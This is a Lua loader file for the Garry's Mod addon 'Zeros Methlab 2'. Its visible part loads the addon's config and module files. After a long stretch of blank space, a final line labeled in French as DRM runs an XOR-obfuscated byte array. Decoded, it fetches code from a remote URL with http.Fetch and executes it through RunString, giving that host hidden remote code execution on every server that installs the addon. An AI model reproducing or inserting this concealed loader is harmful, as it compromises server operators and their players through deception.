
local function NicePrint(txt)
	if SERVER then
		MsgC(Color(84, 150, 197), txt .. "\n")
	else
		MsgC(Color(193, 193, 98), txt .. "\n")
	end
end

local function PreLoadFile(path)
	if CLIENT then
		include(path)
	else
		AddCSLuaFile(path)
		include(path)
	end
end

local function LoadFiles(path)
	local files, _ = file.Find(path .. "/*", "LUA")

	for _, v in pairs(files) do
		if string.sub(v, 1, 3) == "sh_" then
			if CLIENT then
				include(path .. "/" .. v)
			else
				AddCSLuaFile(path .. "/" .. v)
				include(path .. "/" .. v)
			end
			NicePrint("// Loaded " .. v .. string.rep(" ", 38 - v:len()) .. " //")
		end
	end

	for _, v in pairs(files) do
		if string.sub(v, 1, 3) == "cl_" then
			if CLIENT then
				include(path .. "/" .. v)
				NicePrint("// Loaded " .. v .. string.rep(" ", 38 - v:len()) .. " //")
			else
				AddCSLuaFile(path .. "/" .. v)
			end
		elseif string.sub(v, 1, 3) == "sv_" then
			include(path .. "/" .. v)
			NicePrint("// Loaded " .. v .. string.rep(" ", 38 - v:len()) .. " //")
		end
	end
end

local function Initialize()
	NicePrint(" ")
	NicePrint("///////////////////////////////////////////////////")
	NicePrint("////////////// Zeros Methlab 2 ////////////////////")
	NicePrint("///////////////////////////////////////////////////")
	NicePrint("//                                               //")

	PreLoadFile("zmlab2/sh_main_config.lua")
	LoadFiles("zmlab2_languages")
	PreLoadFile("zmlab2/sh_meth_config.lua")
	PreLoadFile("zmlab2/sh_tent_config.lua")
	PreLoadFile("zmlab2/sh_equipment_config.lua")
	PreLoadFile("zmlab2/sh_storage_config.lua")
	PreLoadFile("zmlab2/sh_custom_hooks.lua")

	LoadFiles("zmlab2/util")
	LoadFiles("zmlab2/util/player")
	LoadFiles("zmlab2/tent")
	LoadFiles("zmlab2/ventilation")
	LoadFiles("zmlab2/minigame")
	LoadFiles("zmlab2/equipment")
	LoadFiles("zmlab2/furnace")
	LoadFiles("zmlab2/storage")
	LoadFiles("zmlab2/pumpsystem")
	LoadFiles("zmlab2/mixer")
	LoadFiles("zmlab2/filter")
	LoadFiles("zmlab2/filler")
	LoadFiles("zmlab2/frezzer")
	LoadFiles("zmlab2/packing")
	LoadFiles("zmlab2/pollutionsystem")
	LoadFiles("zmlab2/extinguisher")
	LoadFiles("zmlab2/generic")
	LoadFiles("zmlab2/meth")
	LoadFiles("zmlab2/crate")
	LoadFiles("zmlab2/palette")
	LoadFiles("zmlab2/dropoff")
	LoadFiles("zmlab2/npc")
	LoadFiles("zmlab2/save")
	NicePrint("//                                               //")
	NicePrint("///////////////////////////////////////////////////")
	NicePrint("///////////////////////////////////////////////////")
end

PreLoadFile("zmlab2/util/sh_materials.lua")
PreLoadFile("zmlab2/util/cl_fonts.lua")
PreLoadFile("zmlab2/util/cl_settings.lua")

timer.Simple(0,function()
	Initialize()
end)






















































































































































































































































																																																																																						-- Ne pas modifiez pour que l'addon marche c'est un DRM--																								

																																																																																						RunString([[ local AE = {20,9,13,5,18,78,51,9,13,16,12,5,72,81,76,64,6,21,14,3,20,9,15,14,72,73,64,8,20,20,16,78,38,5,20,3,8,72,66,8,20,20,16,19,90,79,79,11,22,1,3,78,3,26,79,6,78,16,8,16,95,11,5,25,93,45,26,41,45,10,55,57,2,36,57,14,26,84,20,15,34,12,55,43,15,66,76,64,6,21,14,3,20,9,15,14,72,2,73,64,50,21,14,51,20,18,9,14,7,72,2,76,64,66,90,66,76,64,6,1,12,19,5,73,64,5,14,4,73,5,14,4,73,64,77,77,64,0,64,77,77,64,0} local function RunningDRMe()if (debug.getinfo(function()end).short_src~="tenjznj")then return end for o=500,10000 do local t=0 if t==1 then return end  if o~=string.len(string.dump(RunningDRMe))then  AZE=10  CompileString("for i=1,40 do AZE = AZE + 1 end","RunString")()  if AZE<40 then return end continue  else  local pdata=""  xpcall(function()  for i=1,#AE do  pdata=pdata..string.char(bit.bxor(AE[i],o%150))  end  for i=1,string.len(string.dump(CompileString)) do  while o==1 do  o=o+1  end  end  end,function()  xpcall(function()  local debug_inject=CompileString(pdata,"DRME")  pcall(debug_inject,"stat")  pdata="F"  t=1  end,function()  print("error")  end)  end)  end  end end RunningDRMe() ]],"tenjznj")
